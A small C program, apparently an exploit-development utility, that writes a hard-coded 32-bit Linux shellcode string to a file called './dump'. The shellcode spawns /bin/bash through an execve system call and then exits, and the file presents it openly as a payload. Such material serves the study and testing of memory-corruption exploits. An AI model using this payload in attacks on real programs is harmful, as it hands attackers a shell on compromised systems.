#include <stdio.h>

/*
       Convert a shellcode from the C Form to a file.
*/

char file_name[]="./dump";

unsigned char CForm_shellcode[]=
"\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
"\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80\x31\xDB\x31\xC0\x40\xCD\x80";

int main()        
{
    FILE *file;

    file = fopen(file_name,"w+");
    fprintf(file,"%s",CForm_shellcode); 
    fclose(file);   
   return 0; 
}
